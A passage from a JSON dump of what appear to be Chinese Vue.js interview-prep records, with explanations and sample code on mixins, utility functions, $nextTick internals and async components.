或显式调用 Mixin 中的方法。\n\n- **生命周期钩子函数合并**：\n  Vue 会将 Mixin 和组件的生命周期钩子函数合并。如果同名钩子函数都存在，它们会按顺序执行（Mixin 的钩子在组件的钩子之前执行）。\n  ```javascript\n  const myMixin = {\n    created() {\n      console.log('Mixin created');\n    }\n  };\n\n  const myComponent = {\n    created() {\n      console.log('Component created');\n    },\n    mixins: [myMixin]\n  };\n  ```\n  输出：\n  ```\n  Mixin created\n  Component created\n  ```\n\n---\n\n### **3. 使用 Mixin 的场景**\n#### **问题：**\n1. 在什么场景下使用 Mixin 会比较合适？\n2. 使用 Mixin 时，有哪些需要注意的潜在问题？\n\n#### **考察点：**\n- **适用场景**：\n  - **功能复用**：如果多个组件之间需要共享相同的逻辑（如同一组方法、生命周期钩子、事件处理等），Mixin 是一个方便的选择。例如，多个组件需要执行相同的请求处理、事件监听、或者处理相同的状态。\n  - **跨组件共享逻辑**：当业务逻辑跨越多个组件时，使用 Mixin 可以避免重复代码。\n\n- **潜在问题**：\n  - **命名冲突**：如果 Mixin 和组件中有相同的属性或方法，可能会引发命名冲突。\n  - **可维护性差**：当项目中使用大量 Mixin 时，可能会导致项目代码难以维护和调试，因为难以追踪哪些功能来源于 Mixin，哪些来自组件本身。\n  - **过度依赖 Mixin**：过度使用 Mixin 会导致代码高度耦合，尤其是在大型项目中，使用过多的 Mixin 会使得组件之间的关系复杂化，降低组件的独立性和可重用性。\n\n---\n\n### **4. Mixin 与 Composition API 的比较**\n#### **问题：**\n1. 在 Vue 3 中，为什么 Composition API 相比于 Mixin 更被推荐？\n2. 你会如何在 Vue 3 中使用 Composition API 来替代 Mixin？\n\n#### **考察点：**\n- **Composition API** 提供了一种新的逻辑复用方式，它通过 `setup()` 函数和组合式函数让代码更加清晰和可维护。\n  - **解耦**：Composition API 允许将相关逻辑封装为独立的函数，这比 Mixin 更具灵活性和可读性。\n  - **避免命名冲突**：因为 Composition API 使用的是函数而不是对象，所以避免了 Mixin 中可能出现的命名冲突。\n  - **类型推导**：使用 Composition API 时，可以更方便地进行类型推导，尤其在 TypeScript 中，能够减少潜在的类型错误。\n\n  示例：\n  ```javascript\n  // 使用 Composition API 替代 Mixin\n  import { ref, onMounted } from 'vue';\n\n  export default {\n    setup() {\n      const sharedData = ref('component data');\n\n      const mixinMethod = () => {\n        console.log('This is a method from Composition API');\n      };\n\n      onMounted(() => {\n        console.log(sharedData.value);\n      });\n\n      return {\n        sharedData,\n        mixinMethod\n      };\n    }\n  };\n  ```\n\n- **优缺点对比**：\n  - **Mixin**：适用于简单的逻辑复用，但存在命名冲突、难以维护等问题。\n  - **Composition API**：提供更清晰的逻辑组织方式，避免命名冲突，适合更复杂的逻辑复用。\n\n---\n\n### **5. Mixin 的高级用法**\n#### **问题：**\n1. 如何通过 Mixin 实现一个全局的行为，比如全局日志记录、权限控制等？\n2. Mixin 如何与 Vuex 结合使用，共享状态和方法？\n\n#### **考察点：**\n- **全局行为**：你可以将全局的逻辑（如日志记录、权限校验等）封装到 Mixin 中，以便在多个组件中复用：\n  ```javascript\n  const logMixin = {\n    created() {\n      console.log(`Component ${this.$options.name} created`);\n    }\n  };\n  ```\n\n- **与 Vuex 结合使用**：你可以通过 Mixin 与 Vuex 结合，提供全局状态或方法：\n  ```javascript\n  const storeMixin = {\n    computed: {\n      ...Vuex.mapState(['user']),\n    },\n    methods: {\n      ...Vuex.mapActions(['fetchData']),\n    }\n  };\n  ```\n\n---\n\n### **总结**\nVue 中的 Mixin 是一个强大的功能，能够有效地实现组件间的逻辑复用。面试中，考察点通常会包括 Mixin 的基本用法、合并机制、使用场景、潜在问题以及与 Composition API 的比较。面试者需要理解如何使用 Mixin 来复用逻辑，并且能明确在何时应该选择 Mixin 以及何时应该使用其他方法（如 Composition API）来替代 Mixin。",
    "exerciseKeyList": "[\"c1bcc1f1-3375-4c66-b3af-1ba1b937c01f\"]",
    "vipLimit": 1,
    "level": 1.5,
    "pointOrder": 1,
    "createAt": "2024-10-05T02:49:30.000Z",
    "updateAt": "2024-12-15T11:58:00.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "c1bcc1f1-3375-4c66-b3af-1ba1b937c01f",
        "title": "说说你对vue的mixin的理解，以及有哪些应用场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:38:57.000Z",
        "updateAt": "2024-08-10T17:04:42.000Z"
      }
    ]
  },
  "78": {
    "id": 78,
    "tagId": 14,
    "title": "工具函数",
    "explanation": "#### 一、Vue.util：Vue.js的工具函数集合\n\nVue.util是Vue.js内部的一个工具函数集合，包含了多种实用的方法，用于处理各种常见的任务。然而，需要注意的是，Vue.util并不是Vue.js公开API的一部分，这意味着它的使用可能会随着Vue.js版本的更新而发生变化。因此，在开发过程中，应尽量避免直接使用Vue.util中的方法，而是使用Vue.js提供的公开API或其他更稳定的解决方案。\n\n尽管如此，了解Vue.util中的一些方法仍然有助于我们更好地理解Vue.js的内部机制。例如，Vue.util.extend方法用于将一个或多个对象的属性混合到目标对象中，这在需要将多个对象合并到一个新对象中时非常有用。然而，随着Vue.js的发展，许多原本在Vue.util中的方法已经被移动到其他更合适的API中，或者被更现代的方法所替代。\n\n#### 二、Vue.set：动态添加响应式属性\n\nVue.set是Vue.js提供的一个全局方法，用于向响应式对象添加一个新的属性，并确保该属性是响应式的。在默认情况下，Vue.js只能检测到已经存在的对象的属性并将其转换为响应式属性，但对于后期动态添加的属性，Vue.js无法自动进行响应式转换。这时，就可以使用Vue.set方法手动将属性转换为响应式。\n\nVue.set方法接受三个参数：对象、属性名和属性值。例如：\n\n```javascript\nVue.set(vm.someObject, 'newProperty', 'Hello, Vue!');\n```\n\n上面的代码将`someObject`对象的`newProperty`属性设置为`'Hello, Vue!'`，并将其转换为响应式属性。这样，当属性值发生修改时，Vue可以检测到并响应式地更新视图。\n\nVue.set方法的主要优势在于它能够将属性添加为响应式属性，使得Vue.js能够跟踪和响应属性值的变化，从而及时更新视图。此外，Vue.set方法还可以用于在数组中添加新元素，使其成为响应式。\n\n#### 三、Vue.delete：删除响应式对象的属性\n\nVue.delete是Vue.js提供的另一个全局方法，用于从响应式对象中删除指定的属性。与Vue.set方法类似，Vue.delete也可以触发响应式更新，使Vue能够正确追踪到属性的删除操作。\n\nVue.delete方法接受两个参数：要删除的属性所在的对象和要删除的属性名。例如：\n\n```javascript\nVue.delete(this.someObject, 'someProperty');\n```\n\n上面的代码将从`someObject`对象中删除`someProperty`属性，并相应地更新视图。\n\n需要注意的是，Vue.delete方法只能用于响应式对象，而不能用于普通的JavaScript对象。此外，在删除数组中的元素时，Vue.js提供了一些数组特定的方法（如splice、push、pop等）来确保数组的响应式更新。因此，在删除数组元素时，应优先使用这些方法而不是Vue.delete。\n\n#### 四、实际应用中的注意事项\n\n在使用Vue.set和Vue.delete等工具函数时，需要注意以下几点：\n\n1. **避免直接操作对象或数组**：在Vue.js中，直接修改对象或数组的属性或元素可能不会触发视图更新。因此，应优先使用Vue.set和Vue提供的数组方法来修改响应式数据。\n2. **注意命名冲突**：在添加新属性时，应确保属性名不与现有属性名冲突，以避免覆盖现有属性。\n3. **了解Vue.js的响应式机制**：为了更好地使用Vue.set和Vue.delete等工具函数，需要了解Vue.js的响应式机制以及它是如何跟踪和响应数据变化的。\n",
    "testPoint": "### **1. Vue 内置工具函数**\n#### **问题：**\n1. Vue 提供了哪些内置工具函数？\n2. 这些工具函数的使用场景是什么？\n\n#### **考察点：**\n\n- **Vue.set 和 Vue.delete**：\n  Vue 中的 `Vue.set` 和 `Vue.delete` 是为了响应式系统而提供的工具函数，它们用于确保在数组或对象中添加、删除元素时，能够保持数据的响应性。\n  - `Vue.set`：用于向对象中添加新的属性，并确保该属性是响应式的。\n    ```javascript\n    Vue.set(obj, 'newProp', value);\n    ```\n  - `Vue.delete`：用于删除对象或数组中的元素，并保持响应性。\n    ```javascript\n    Vue.delete(obj, 'propertyName');\n    Vue.delete(arr, index);\n    ```\n\n- **Vue.nextTick**：\n  `Vue.nextTick` 是一个异步队列，用于在 DOM 更新后执行回调函数。它保证了在 Vue 完成 DOM 更新后，回调才会被执行。\n  ```javascript\n  Vue.nextTick(() => {\n    console.log('DOM has been updated!');\n  });\n  ```\n\n- **Vue.util**：\n  Vue 提供了一些工具函数，如 `Vue.util.extend` 用于对象的深拷贝，`Vue.util.merge` 用于合并对象。\n\n---\n\n### **2. 自定义工具函数的常见应用**\n#### **问题：**\n1. 你在 Vue 项目中常用哪些自定义工具函数？请列举一些例子。\n2. 如何编写一个简单的工具函数来简化 Vue 中的日期格式化？\n\n#### **考察点：**\n\n- **日期格式化工具函数**：\n  在 Vue 项目中，常常需要对日期进行格式化。你可以创建一个工具函数来统一处理日期格式。\n  ```javascript\n  // utils/date.js\n  export function formatDate(date, format = 'YYYY-MM-DD') {\n    const d = new Date(date);\n    const map = {\n      'YYYY': d.getFullYear(),\n      'MM': String(d.getMonth() + 1).padStart(2, '0'),\n      'DD': String(d.getDate()).padStart(2, '0'),\n      'HH': String(d.getHours()).padStart(2, '0'),\n      'mm': String(d.getMinutes()).padStart(2, '0'),\n      'ss': String(d.getSeconds()).padStart(2, '0'),\n    };\n    return format.replace(/YYYY|MM|DD|HH|mm|ss/g, matched => map[matched]);\n  }\n  ```\n\n  在组件中使用该工具函数：\n  ```javascript\n  import { formatDate } from './utils/date';\n\n  export default {\n    data() {\n      return {\n        date: '2024-12-15T12:00:00',\n      };\n    },\n    computed: {\n      formattedDate() {\n        return formatDate(this.date, 'YYYY-MM-DD HH:mm:ss');\n      }\n    }\n  };\n  ```\n\n- **深拷贝工具函数**：\n  在某些场景下，你可能需要深拷贝对象，避免对原始对象进行修改。\n  ```javascript\n  export function deepClone(obj) {\n    return JSON.parse(JSON.stringify(obj));\n  }\n  ```\n\n---\n\n### **3. Vue 的过滤器（Filters）**\n#### **问题：**\n1. Vue 中的过滤器有什么作用？举个例子说明。\n2. 过滤器和工具函数有何区别，何时使用过滤器，何时使用工具函数？\n\n#### **考察点：**\n\n- **Vue 过滤器**：\n  过滤器是用于格式化输出数据的一种工具，在 Vue 模板中可以直接使用，但仅适用于模板中的数据绑定。常用的场景是格式化日期、数字等。\n  ```javascript\n  Vue.filter('currency', function (value) {\n    return '$' + value.toFixed(2);\n  });\n\n  // 在模板中使用\n  {{ price | currency }}\n  ```\n\n- **工具函数与过滤器的区别**：\n  - **过滤器**：通常用于模板中，只能格式化输出。\n  - **工具函数**：可以在组件的任何地方使用，提供更强的逻辑处理能力，适合更复杂的功能（如数据计算、事件管理等）。\n\n---\n\n### **4. Vuex 与工具函数**\n#### **问题：**\n1. 如何通过工具函数简化 Vuex 的一些操作？\n2. 你会如何编写一个工具函数来帮助管理 Vuex 中的 getter、mutation 或 action？\n\n#### **考察点：**\n在 Vuex 中，常常需要对数据进行集中管理。可以通过工具函数来简化 Vuex 操作，避免重复代码。\n  \n- **简化 Vuex action**：\n  假设你有多个组件需要获取相同的数据，你可以创建一个工具函数来简化这部分逻辑。\n  ```javascript\n  // utils/vuex.js\n  export function fetchData(store, action) {\n    return store.dispatch(action)\n      .catch(error => {\n        console.error(`Error fetching data: ${error}`);\n      });\n  }\n  ```\n\n  在组件中使用：\n  ```javascript\n  import { fetchData } from './utils/vuex';\n\n  export default {\n    methods: {\n      loadData() {\n        fetchData(this.$store, 'fetchDataAction');\n      }\n    }\n  };\n  ```\n\n---\n\n### **5. Vue 中的性能优化工具函数**\n#### **问题：**\n1. 如何编写工具函数来帮助优化 Vue 组件的性能？\n2. 请解释如何使用防抖和节流函数来提高 Vue 应用的性能。\n\n#### **考察点：**\n\n- **防抖（Debounce）函数**：\n  防抖是限制函数执行频率的一种方式，当连续触发事件时，只有在停止触发一段时间后，才会执行函数。\n  ```javascript\n  export function debounce(fn, delay = 300) {\n    let timer;\n    return function (...args) {\n      clearTimeout(timer);\n      timer = setTimeout(() => fn.apply(this, args), delay);\n    };\n  }\n  ```\n\n  使用防抖：\n  ```javascript\n  export default {\n    data() {\n      return { searchQuery: '' };\n    },\n    methods: {\n      search: debounce(function() {\n        console.log(this.searchQuery);\n      }, 500)\n    }\n  };\n  ```\n\n- **节流（Throttle）函数**：\n  节流是限制函数在单位时间内只执行一次。\n  ```javascript\n  export function throttle(fn, delay = 300) {\n    let lastTime = 0;\n    return function (...args) {\n      const now = Date.now();\n      if (now - lastTime >= delay) {\n        lastTime = now;\n        fn.apply(this, args);\n      }\n    };\n  }\n  ```\n\n---\n\n### **6. 使用工具函数时的最佳实践**\n#### **问题：**\n1. 在 Vue 项目中编写工具函数时，有哪些最佳实践？\n2. 如何确保工具函数在不同的组件中可复用并且容易维护？\n\n#### **考察点：**\n\n- **模块化**：将工具函数放入单独的模块中，按功能划分文件（如 `date.js`、`utils.js` 等），避免在多个地方重复定义相同的函数。\n- **命名清晰**：工具函数的命名应具备描述性，清楚表达函数的功能。\n- **避免副作用**：工具函数应尽量避免修改外部状态，保持纯粹性，这样能避免不必要的错误。\n- **测试**：为工具函数编写单元测试，确保其在不同场景下都能正确工作。\n\n---\n\n### **总结**\n在 Vue 中，工具函数是处理常见任务的有效手段，它们不仅提高了代码复用性，还能简化组件逻辑。面试时，考察点通常涉及 Vue 内置工具函数、自定义工具函数的编写与应用、Vuex 中的工具函数、性能优化等方面。掌握这些工具函数并能在实际项目中灵活应用，能大大提高代码质量和项目维护性。",
    "exerciseKeyList": "[\"3622c49b-aa21-46f9-8818-b03eb41b0745\",\"a0c75651-7e44-437d-9f1f-38775698091b\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T02:54:25.000Z",
    "updateAt": "2024-12-15T11:59:11.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "3622c49b-aa21-46f9-8818-b03eb41b0745",
        "title": "说一下 vm.$set 原理\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-06-06T01:33:39.000Z",
        "updateAt": "2024-08-10T19:09:01.000Z"
      },
      {
        "exerciseKey": "a0c75651-7e44-437d-9f1f-38775698091b",
        "title": "Vue中的$nextTick有什么作用？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:38:21.000Z",
        "updateAt": "2024-08-10T17:04:41.000Z"
      }
    ]
  },
  "79": {
    "id": 79,
    "tagId": 14,
    "title": "$nextTick",
    "explanation": "`nextTick` 是 Vue 的一个核心实现，`$nextTick`方法将回调延迟到下次DOM更新循环之后执行。**Vue 的 nextTick 其本质是对 JavaScript 执行原理 EventLoop 的一种应用。**\n\nnextTick 的核心是利用了如 Promise 、MutationObserver、setImmediate、setTimeout的原生 JavaScript 方法来模拟对应的微/宏任务的实现，本质是为了利用 JavaScript 的这些异步回调任务队列来实现 Vue 框架中自己的异步回调队列\n\n前置知识 - js事件循环\n=============\n\nJS 运行机制\n-------\n\nJS 执行是单线程的，基于事件循环。事件循环大致分为以下步骤：\n\n1.  所有同步任务都在主线程上执行，形成一个执行栈。\n2.  异步任务放进任务队列，异步任务分为宏任务和微任务\n3.  执行栈所有同步任务执行完成，就会执行任务队列。对应的异步任务，结束等待状态，进入执行栈，开始执行。\n4.  主线程不断重复上面的第三步。\n\n主线程的执行过程就是一个 tick，而所有的异步结果都是通过 “任务队列” 来调度。 消息队列中存放的是一个个的任务（task）。 task 分为两大类，分别是 macro task 和 micro task，并且每个 macro task(宏任务) 结束后，都要清空所有的 micro task(微任务)。\n\n如图所示\n\n```javascript\nfor (macroTask of macroTaskQueue) {\n    // 执行宏任务\n    handleMacroTask();\n      \n    // 执行所有微任务\n    for (microTask of microTaskQueue) {\n        handleMicroTask(microTask);\n    }\n}\n\n```\n\n`宏任务`： script、setTimeout、setInterval、Node中的setImmediate 等  \n`微任务`： Promise.then、MutationObserver、Node 中的 Process.nextTick等\n\nnextTick的具体实现原理\n===============\n\n**上源码**\n\n源码分为两部分，一是判断当前环境能使用的 `API` 并保存异步函数，二是调用异步函数执行回调队列\n\n`timerFunc`函数定义，根**据当前环境支持什么方法则确定调用哪个**，分别有：\n\n```\nPromise.then`、`MutationObserver`、`setImmediate`、`setTimeout\n\n```\n\n通过上面任意一种方法，进行降级操作\n\n```javascript\nexport let isUsingMicroTask = false \nconst callbacks = [] // 回调队列\nlet pending = false\n\n// 该方法执行队列中的全部回调\nfunction flushCallbacks () {\n  pending = false\n  const copies = callbacks.slice(0)\n  callbacks.length = 0\n  // 执行任务队列\n  for (let i = 0; i < copies.length; i++) {\n    copies[i]()\n  }\n}\nlet timerFunc // 用来保存调用异步任务方法\n// 判断1：是否原生支持Promise\nif (typeof Promise !== 'undefined' && isNative(Promise)) {\n  // 保存一个异步任务\n  const p = Promise.resolve()\n  timerFunc = () => {\n    // 执行回调函数\n    p.then(flushCallbacks)\n    if (isIOS) setTimeout(noop)\n  }\n  isUsingMicroTask = true\n} else if (!isIE && typeof MutationObserver !== 'undefined' && (\n  isNative(MutationObserver) ||\n  MutationObserver.toString() === '[object MutationObserverConstructor]'\n)) {\n  // 判断2：是否原生支持MutationObserver\n  let counter = 1\n  const observer = new MutationObserver(flushCallbacks)\n  const textNode = document.createTextNode(String(counter))\n  observer.observe(textNode, {\n    characterData: true\n  })\n  timerFunc = () => {\n    counter = (counter + 1) % 2\n    textNode.data = String(counter)\n  }\n  isUsingMicroTask = true\n} else if (typeof setImmediate !== 'undefined' && isNative(setImmediate)) {\n  //判断3：是否原生支持setImmediat\n  timerFunc = () => {\n    setImmediate(flushCallbacks)\n  }\n} else {\n  //判断4：上面都不行，直接用setTimeout\n  timerFunc = () => {\n    setTimeout(flushCallbacks, 0)\n  }\n}\n\n\n```\n```javascript\nexport function nextTick(cb?: Function, ctx?: Object) {\n  let _resolve;\n​\n  // cb 回调函数会经统一处理压入 callbacks 数组\n  callbacks.push(() => {\n    if (cb) {\n      try {\n        cb.call(ctx);\n      } catch (e) {\n        handleError(e, ctx, 'nextTick');\n      }\n    } else if (_resolve) {\n      _resolve(ctx);\n    }\n  });\n​\n  // 执行异步延迟函数 timerFunc\n  if (!pending) {\n    pending = true;\n    timerFunc();\n  }\n​\n  // 当 nextTick 没有传入函数参数的时候，返回一个 Promise 化的调用\n  if (!cb && typeof Promise !== 'undefined') {\n    return new Promise(resolve => {\n      _resolve = resolve;\n    });\n  }\n}\n\n```\n\n`callbacks`就是异步操作队列\n\n`callbacks`新增回调函数后又执行了`timerFunc`函数，`pending`是用来标识同一个时间只能执行一次\n\n```javascript\nfunction flushCallbacks () {\n  pending = false\n  const copies = callbacks.slice(0)\n  callbacks.length = 0\n  for (let i = 0; i < copies.length; i++) {\n    copies[i]()\n  }\n}\n\n```\n\n把回调函数放入callbacks等待执行，将执行函数放到微任务或者宏任务中 无论是微任务还是宏任务，都会放到`flushCallbacks`使用，这里将`callbacks`里面的函数复制一份，同时`callbacks`置空\n\n循环遍历执行`callbacks`里面的函数\n\n总结\n==\n\n1.  Vue 的 nextTick 其本质是对 JavaScript 执行原理 EventLoop 的一种应用\n2.  nextTick核心是利用了如 Promise 、MutationObserver、setImmediate、setTimeout的原生 JavaScript 方法来模拟对应的微/宏任务的实现，根据当前环境支持什么方法则确定调用哪个\n\n  ",
    "testPoint": "### **1. 基本概念与使用场景**\n#### **问题：**\n1. Vue 中的 `$nextTick` 是什么？它有什么用？\n2. 你能举一个实际项目中使用 `$nextTick` 的例子吗？\n\n#### **考察点：**\n- **基本概念**：\n  `$nextTick` 用于在下次 DOM 更新时执行回调。在 Vue 中，数据变化会触发视图更新，但视图更新是异步的，`$nextTick` 提供了一种在 DOM 更新后执行操作的方式。\n  ```javascript\n  this.$nextTick(() => {\n    // 在 DOM 更新之后执行的代码\n  });\n  ```\n\n- **常见使用场景**：\n  - **访问更新后的 DOM 元素**：当你需要访问更新后的 DOM（如获取元素的尺寸、位置等），可以使用 `$nextTick` 来确保在 DOM 更新完成后再执行操作。\n  - **与第三方库的集成**：有时候需要与第三方库（如 jQuery、D3.js 等）进行交互，通常它们需要在 DOM 完全渲染后才能操作，因此 `$nextTick` 也非常有用。\n  - **动画**：在某些情况下，DOM 更新后需要立刻应用动画样式，`$nextTick` 确保样式更新后再执行动画。\n\n---\n\n### **2. 工作原理**\n#### **问题：**\n1. `$nextTick` 是如何工作的？为什么它能保证在 DOM 更新后执行回调？\n2. 如果你有多个 `$nextTick` 调用，它们的执行顺序是什么？\n\n#### **考察点：**\n- **工作原理**：\n  在 Vue 中，数据更新触发视图更新是异步的，Vue 会将这些视图更新操作放入一个队列中。`$nextTick` 提供的回调会被推入一个队列，确保它会在下次 DOM 更新完成后执行。\n  \n- **多个 `$nextTick` 调用的执行顺序**：\n  如果在同一个事件循环中调用多个 `$nextTick`，它们会被推到同一个队列中，依次执行。Vue 会在下次 DOM 更新完成后，按顺序依次执行所有的 `$nextTick` 回调。\n  ```javascript\n  this.$nextTick(() => {\n    console.log('Next tick 1');\n  });\n\n  this.$nextTick(() => {\n    console.log('Next tick 2');\n  });\n\n  // 输出顺序是：\n  // 'Next tick 1'\n  // 'Next tick 2'\n  ```\n\n---\n\n### **3. 与异步更新的关系**\n#### **问题：**\n1. 为什么 Vue 的数据更新是异步的？`$nextTick` 与异步更新有何关系？\n2. 如何利用 `$nextTick` 来保证 DOM 更新后的操作？\n\n#### **考察点：**\n- **异步更新的原因**：\n  Vue 会批量更新 DOM 来提高性能，而不是每次数据变化都立即更新 DOM。这种异步更新机制意味着你不能立即在数据更新后访问到更新后的 DOM，`$nextTick` 就是为了解决这个问题，提供了一种方法来等待 DOM 更新完成后再执行操作。\n\n- **操作顺序**：\n  在数据更新后，如果你需要立即访问更新后的 DOM，应该使用 `$nextTick` 来确保在 DOM 更新完成后再执行相关操作。\n  ```javascript\n  this.someData = 'new data';\n  this.$nextTick(() => {\n    console.log(this.$refs.someElement); // 确保获取到最新的 DOM\n  });\n  ```\n\n---\n\n### **4. 与 Vue 生命周期的结合**\n#### **问题：**\n1. `$nextTick` 如何与 Vue 生命周期钩子一起使用？\n2. 在 Vue 生命周期中的哪些时机适合使用 `$nextTick`？\n\n#### **考察点：**\n- **生命周期钩子与 `$nextTick`**：\n  `$nextTick` 在 Vue 中非常有用，尤其是在生命周期钩子中，尤其是在一些视图更新相关的钩子（如 `mounted`、`updated`）中。\n\n  - **`mounted`**：在组件实例被挂载到 DOM 后调用，此时 DOM 渲染已经完成，但如果你需要等 DOM 完全更新后再执行某些操作，可以使用 `$nextTick`。\n  - **`updated`**：在数据变化后，DOM 更新完成时调用。如果你需要在数据变化后执行一些操作（如操作 DOM），可以使用 `$nextTick` 来确保操作的是最新的 DOM。\n  \n  ```javascript\n  mounted() {\n    this.$nextTick(() => {\n      console.log('DOM has been mounted');\n    });\n  }\n  ```\n\n---\n\n### **5. 与 `setTimeout` 和 `Promise` 的区别**\n#### **问题：**\n1. `$nextTick` 和 `setTimeout` 有什么区别？它们的执行时机如何？\n2. `$nextTick` 和 `Promise` 的 `then` 有什么区别？\n\n#### **考察点：**\n- **`$nextTick` 与 `setTimeout`**：\n  `setTimeout` 是将回调推入宏任务队列中，而 `$nextTick` 则是将回调推入微任务队列中。微任务会在当前事件循环结束时立即执行，而宏任务会在下一轮事件循环时执行。因此，`$nextTick` 的回调比 `setTimeout` 的回调执行得更早。\n  \n  ```javascript\n  this.$nextTick(() => {\n    console.log('nextTick');\n  });\n  setTimeout(() => {\n    console.log('setTimeout');\n  }, 0);\n\n  // 输出顺序：\n  // 'nextTick'\n  // 'setTimeout'\n  ```\n\n- **`$nextTick` 与 `Promise.then`**：\n  `$nextTick` 和 `Promise.then` 都是微任务，但它们的使用场景有所不同。`$nextTick` 是 Vue 特有的，它确保在数据更新后立即执行回调，而 `Promise.then` 是 JavaScript 原生的异步处理方法。\n\n---\n\n### **总结**\n\n`$nextTick` 是 Vue 中一个非常重要的工具，它使得在 DOM 更新后执行回调成为可能，避免了直接访问尚未更新的 DOM。理解 `$nextTick` 的工作原理，以及它如何与 Vue 的生命周期、异步更新和事件循环机制相结合，是深入理解 Vue 的关键之一。在面试中，考察点通常涉及它的使用场景、工作原理、生命周期钩子中的结合，以及与其他异步机制（如 `setTimeout` 和 `Promise`）的区别。",
    "exerciseKeyList": "[\"a0c75651-7e44-437d-9f1f-38775698091b\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T02:59:38.000Z",
    "updateAt": "2024-12-15T12:00:33.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "a0c75651-7e44-437d-9f1f-38775698091b",
        "title": "Vue中的$nextTick有什么作用？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:38:21.000Z",
        "updateAt": "2024-08-10T17:04:41.000Z"
      }
    ]
  },
  "81": {
    "id": 81,
    "tagId": 14,
    "title": "异步组件",
    "explanation": "当我们的项目达到一定的规模时，对于某些组件来说，我们并不希望一开始全部加载，而是需要的时候进行加载；这样的做得目的可以很好的提高用户体验。\n\n为了实现这个功能，Vue3中为我们提供了一个方法，即`defineAsyncComponent`，这个方法可以传递两种类型的参数，分别是函数类型和对象类型，接下来我们分别学习。\n\n传递工厂函数作为参数\n----------\n\n`defineAsyncComponent`方法接收一个工厂函数是它的基本用法，这个工厂函数必须返回一个`Promise`，`Promise`的`resolve`应该返回一个组件。\n\n我们这里以Vue Cli创建的项目为例，这里我稍微做了一下修改，将头部的图片拆分为一个组件，代码如下：\n\n```javascript\n<template>\n  <logo-img />\n  <hello-world msg=\"Welcome to Your Vue.js App\" />\n</template>\n\n<script setup>\nimport LogoImg from './components/LogoImg.vue'\nimport HelloWorld from './components/HelloWorld.vue'\n</script>\n\n```\n\n现在我们就将`<hello-world>`组件修改为异步组件，示例代码如下：\n\n```javascript\n<template>\n  <logo-img />\n  <hello-world msg=\"Welcome to Your Vue.js App\" />\n</template>\n\n<script setup>\nimport { defineAsyncComponent } from 'vue'\nimport LogoImg from './components/LogoImg.vue'\n\n// 简单用法\nconst HelloWorld = defineAsyncComponent(() =>\n  import('./components/HelloWorld.vue'),\n)\n</script>\n\n```\n\n我们这里为了看到效果，将`import`延迟执行，示例代码如下：\n\n```javascript\n<script setup>\nimport { defineAsyncComponent } from 'vue'\nimport LogoImg from './components/LogoImg.vue'\n\n// 定义一个耗时执行的函数，t 表示延迟的时间， callback 表示需要执行的函数，可选\nconst time = (t, callback = () => {}) => {\n  return new Promise(resolve => {\n    setTimeout(() => {\n      callback()\n      resolve()\n    }, t)\n  })\n}\n// 定义异步组件，这里这样写是为了查看效果\nconst HelloWorld = defineAsyncComponent(() => {\n  return new Promise((resolve, reject) => {\n    ;(async function () {\n      try {\n        await time(2000)\n        const res = await import('./components/HelloWorld.vue')\n        resolve(res)\n      } catch (error) {\n        reject(error)\n      }\n    })()\n  })\n})\n</script>\n\n\n```\n\n代码运行结果如下所示：\n\n![异步组件的基础展示.gif](https://static.ecool.fun//article/421bc73a-8f61-4737-b437-ba24e7d2e0f8.awebp)\n\n当2s后才会加载`<hello-world>`组件。\n\n传递对象类型作为参数\n----------\n\n`defineAsyncComponent`方法也可以接收一个对象作为参数，该对象中有如下几个参数：\n\n*   `loader`：同工厂函数；\n*   `loadingComponent`：加载异步组件时展示的组件；\n*   `errorComponent`：加载组件失败时展示的组件；\n*   `delay`：显示`loadingComponent`之前的延迟时间，单位毫秒，默认200毫秒；\n*   `timeout`：如果提供了`timeout`，并且加载组件的时间超过了设定值，将显示错误组件，默认值为`Infinity`（单位毫秒）；\n*   `suspensible`：异步组件可以退出`<Suspense>`控制，并始终控制自己的加载状态。\n*   `onError`：一个函数，该函数包含4个参数，分别是`error`、`retry`、`fail`和`attempts`，这4个参数分别是错误对象、重新加载的函数、加载程序结束的函数、已经重试的次数。\n\n如下代码展示`defineAsyncComponent`方法的对象类型参数的用法：\n\n```javascript\n<template>\n  <logo-img />\n  <hello-world msg=\"Welcome to Your Vue.js App\" />\n</template>\n\n<script setup>\nimport { defineAsyncComponent } from 'vue'\nimport LogoImg from './components/LogoImg.vue'\nimport LoadingComponent from './components/loading.vue'\nimport ErrorComponent from './components/error.vue'\n\n// 定义一个耗时执行的函数，t 表示延迟的时间， callback 表示需要执行的函数，可选\nconst time = (t, callback = () => {}) => {\n  return new Promise(resolve => {\n    setTimeout(() => {\n      callback()\n      resolve()\n    }, t)\n  })\n}\n// 记录加载次数\nlet count = 0\nconst HelloWorld = defineAsyncComponent({\n  // 工厂函数\n  loader: () => {\n    return new Promise((resolve, reject) => {\n      ;(async function () {\n        await time(300)\n        const res = await import('./components/HelloWorld.vue')\n        if (++count < 3) {\n          // 前两次加载手动设置加载失败\n          reject(res)\n        } else {\n          // 大于3次成功\n          resolve(res)\n        }\n      })()\n    })\n  },\n  loadingComponent: LoadingComponent,\n  errorComponent: ErrorComponent,\n  delay: 0,\n  timeout: 1000,\n  suspensible: false,\n  onError(error, retry, fail, attempts) {\n    // 注意，retry/fail 就像 promise 的 resolve/reject 一样：\n    // 必须调用其中一个才能继续错误处理。\n    if (attempts < 3) {\n      // 请求发生错误时重试，最多可尝试 3 次\n      console.log(attempts)\n      retry()\n    } else {\n      fail()\n    }\n  },\n})\n</script>\n\n\n```\n\n上面的代码中，我们加载组件时前两次会请求错误，只有第三次加载才会成功，代码运行结果如下：\n\n![对象参数demo.gif](https://static.ecool.fun//article/94e993fb-63f7-455c-8752-d7d938b4706a.awebp)\n\n如果加载失败则会展示`ErrorComponent`组件。\n\n",
